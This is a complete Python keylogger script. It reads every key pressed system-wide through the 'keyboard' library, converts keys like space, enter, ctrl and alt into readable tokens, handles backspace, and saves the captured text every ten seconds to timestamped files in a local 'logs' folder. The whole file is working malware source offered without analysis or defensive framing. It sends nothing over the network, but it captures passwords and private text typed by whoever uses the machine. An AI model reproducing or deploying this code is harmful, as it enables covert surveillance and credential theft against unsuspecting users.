import keyboard
import threading
import time
from datetime import datetime
import os

global_log = ""
log_lock = threading.Lock() 

# Parse keys and add them to log
def on_press():
    while True:
        event = keyboard.read_event()
        if event.event_type == keyboard.KEY_DOWN:
            key = event.name
            delete = False
            if(key == "space"):
                key = " "
            elif (key == "maiusc"):
                key = ""
            elif (key == "enter"):
                key = "\n[enter]\n"
            elif (key == "ctrl"):
                key = "[ctrl]"
            elif (key == "alt"):
                key = "[alt]"
            elif (key == "backspace"):
                delete = True

            with log_lock:
                global global_log
                if (delete):
                    global_log = global_log[:-1]
                else:
                    global_log += key

def repeat_saves():
    while True:
        time.sleep(10)
        with log_lock:
            global global_log
            if global_log:
                current_time = datetime.now().strftime("%Y-%m-%d %H-%M-%S")
                new_folder = 'logs'
                if not os.path.exists(new_folder):
                    os.makedirs(new_folder)
                with open('logs/'+current_time+'.txt', 'a') as file:
                    file.write(global_log)
                global_log = ''


parse_trd = threading.Thread(target = on_press)
parse_trd.start()

savelog_trd = threading.Thread(target = repeat_saves)
savelog_trd.start()

parse_trd.join()
savelog_trd.join()

